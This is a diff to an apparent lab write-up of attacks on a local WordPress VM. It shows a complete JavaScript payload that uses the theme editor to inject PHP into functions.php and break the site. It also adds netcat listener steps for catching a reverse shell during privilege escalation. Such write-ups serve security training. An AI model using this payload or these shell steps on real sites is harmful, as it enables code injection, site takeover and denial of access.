@@ -54,7 +54,7 @@ In this exploit, I launched a user enumeration attack on WPDistillery.vm
    4. Refresh the page the add this to the end of the URL:
    #i=document.createElement('iframe');document.body.appendChild(i);i.src='/wp-admin/theme-editor.php?      file=functions.php';window.setTimeout(function(){nc=i.contentDocument.querySelector('#newcontent');nc.value='<?php echo "HACK THE PLANET";phpinfo();exit()?>'+nc.value;nc.form.submit.click()},3000)
   
-   5. Users now won't have access to any access to the website.
+   5. Users now won't have access to the website.
 
 ![image](https://user-images.githubusercontent.com/111927957/198875062-37c59997-b311-4f63-a008-697fabf3d330.png)
 
@@ -70,7 +70,12 @@ Exploit 3: Privilege Escalation
       ![image](https://user-images.githubusercontent.com/111927957/198873488-db0d3e67-f8bd-49fc-af98-b69be130547a.png)
       
   4. Make sure to change the IP and Port configuration on the reverse shell php to the correct IP and listening Port so          NetCat can listen to the specified port and access the shell.
-
+  
+  5. Use the following command to listen on the specified port:
+     - nc -lvp 443
+   
+  6. If successful, the user should be inside the console.
+  7. This can be confirmed by using whoami command in the console. 
 
 
 
